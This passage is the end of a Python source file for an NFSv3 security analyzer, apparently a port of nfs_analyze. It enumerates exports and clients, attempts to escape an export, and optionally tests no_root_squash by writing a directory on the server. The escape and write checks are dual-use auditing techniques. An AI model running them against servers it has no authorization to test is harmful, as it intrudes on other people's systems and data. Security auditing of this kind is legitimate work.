	# Composable building blocks (also used by the scanners)
	# ----------------------------------------------------------------- #
	async def collect_exports(self):
		"""Connect to mountd, enumerate exports + connected clients.

		Populates self.report["exports"] and self.mount_results. Returns an
		error (or None) for the mountd connection.
		"""
		mount = self.factory.get_mount()
		_, err = await mount.connect()
		if err is not None:
			self.report["exports"]["status"] = JSONStatus.ERROR
			self.report["exports"]["reason"] = str(err)
			self._out(self.colors.error("Error connecting to mountd: %s" % err))
			return err
		try:
			await self.enumerate_exports(mount)
			await self.enumerate_clients(mount)
		finally:
			await mount.disconnect()
		return None

	async def open_nfs_client(self):
		"""Open an NFSv3 client connection (returns (client, err)).

		Uses the first available export handle as the client root handle;
		the raw helpers used by the checks do not rely on it.
		"""
		root_handle = next((fh for fh, _ in self.mount_results.values() if fh is not None), b"")
		nfs = self.factory.get_client(root_handle)
		_, err = await nfs.connect()
		return nfs, err

	# ----------------------------------------------------------------- #
	# Orchestration
	# ----------------------------------------------------------------- #
	async def run(self):
		self.report["date"] = str(datetime.datetime.now())
		self.report["target"] = str(self.factory.get_target().ip)
		self._out("Checking host %s" % self.report["target"])

		mappings = await self.check_portmap()
		if mappings is None:
			# Without portmap we cannot continue with mountd reliably.
			self.guess_os()
			return self.report

		self._out("")
		await self.collect_exports()

		if self.mount_results:
			self._out("")
			self.check_windows_signing()

			nfs, err = await self.open_nfs_client()
			if err is not None:
				self._out(self.colors.error("Error connecting to NFSv3 server: %s" % err))
			else:
				try:
					await self.try_escape(nfs)
					if self.check_norootsquash:
						await self.check_no_root_squash(nfs)
				finally:
					await nfs.disconnect()

		self.guess_os()
		return self.report


# --------------------------------------------------------------------------- #
# Entry point
# --------------------------------------------------------------------------- #
async def analyze(url, check_no_root_squash=False, btrfs_subvolumes=16, do_ping=False,
				no_color=False, charset="utf-8", verbose_errors=False, json_file=None):
	factory = NFS3ConnectionFactory.from_url(url)
	colors = Coloring(enabled=not no_color)
	analyzer = NFS3Analyzer(
		factory,
		check_no_root_squash=check_no_root_squash,
		btrfs_subvolumes=btrfs_subvolumes,
		do_ping=do_ping,
		charset=charset,
		colors=colors,
		verbose_errors=verbose_errors,
	)
	report = await analyzer.run()
	if json_file is not None:
		with open(json_file, "w") as f:
			json.dump(report, f, indent=4, default=str)
	return report


def main():
	import argparse

	parser = argparse.ArgumentParser(
		description="Analyze an NFSv3 server for common security issues (anfs port of nfs_analyze)")
	parser.add_argument("url", help="Connection string in URL format, e.g. nfs://10.0.0.1")
	parser.add_argument("--check-no-root-squash", action="store_true",
						help="Test if no_root_squash is enabled. WARNING: THIS WRITES A TEST DIRECTORY ON THE SERVER")
	parser.add_argument("--btrfs-subvolumes", type=int, default=16,
						help="Number of subvolumes to probe when escaping a BTRFS export")
	parser.add_argument("--ping", action="store_true",
						help="Ping hosts/clients reported by mountd to determine if they are up")
	parser.add_argument("--no-color", action="store_true", help="Disable colored output")
	parser.add_argument("--charset", default="utf-8", help="Charset used by the server")
	parser.add_argument("--json-file", help="Write the full result as JSON to this file")
	parser.add_argument("--verbose-errors", action="store_true", help="Verbose error logging")
	args = parser.parse_args()

	try:
		asyncio.run(analyze(
			args.url,
			check_no_root_squash=args.check_no_root_squash,
			btrfs_subvolumes=args.btrfs_subvolumes,
			do_ping=args.ping,
			no_color=args.no_color,
			charset=args.charset,
			verbose_errors=args.verbose_errors,
			json_file=args.json_file,
		))
	except Exception:
		traceback.print_exc()


if __name__ == "__main__":
	main()
